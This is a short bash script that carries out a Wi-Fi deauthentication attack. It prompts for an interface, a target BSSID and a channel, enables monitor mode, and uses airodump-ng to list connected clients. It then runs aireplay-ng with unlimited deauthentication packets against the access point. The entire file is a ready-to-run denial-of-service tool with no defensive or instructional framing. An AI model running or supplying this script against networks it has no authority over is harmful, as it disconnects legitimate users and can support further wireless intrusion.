#!/bin/bash

# Ask the user for inputs
read -p "Enter the monitor mode interface (e.g., wlan0mon): " INTERFACE
read -p "Enter the target Wi-Fi BSSID: " BSSID
read -p "Enter the Wi-Fi channel: " CHANNEL

# Check inputs
if [ -z "$BSSID" ]; then
  echo "[!] BSSID cannot be empty. Exiting."
  exit 1
fi

if [ -z "$INTERFACE" ]; then
  echo "[!] Interface cannot be empty. Exiting."
  exit 1
fi

if [ -z "$CHANNEL" ]; then
  echo "[!] Channel cannot be empty. Exiting."
  exit 1
fi

# Set wireless card to monitor mode and channel
echo "[*] Setting interface $INTERFACE to monitor mode on channel $CHANNEL..."
airmon-ng start $INTERFACE $CHANNEL

# Start capturing client MACs with airodump-ng
echo "[*] Capturing clients connected to $BSSID on channel $CHANNEL..."
airodump-ng --bssid $BSSID --channel $CHANNEL --write capture --output-format csv $INTERFACE &

# Allow time for airodump-ng to collect data
sleep 10
killall airodump-ng

# Parse the captured file for client MACs (optional step for debugging)
if [ ! -f "capture-01.csv" ]; then
  echo "[!] Capture file not found. Exiting."
  exit 1
fi

CLIENTS=$(awk -F ',' 'NR > 5 && $1 ~ /([0-9A-F]{2}:){5}[0-9A-F]{2}/ {print $1}' capture-01.csv | grep -v "$BSSID" | sort -u)

# Debug: Show the client MACs found (optional)
echo "[*] Clients connected to $BSSID:"
echo "$CLIENTS"

# Deauthenticate all clients
echo "[*] Sending deauthentication packets to all clients connected to $BSSID..."
aireplay-ng --deauth 0 -a $BSSID $INTERFACE

echo "[*] Deauthentication process complete."
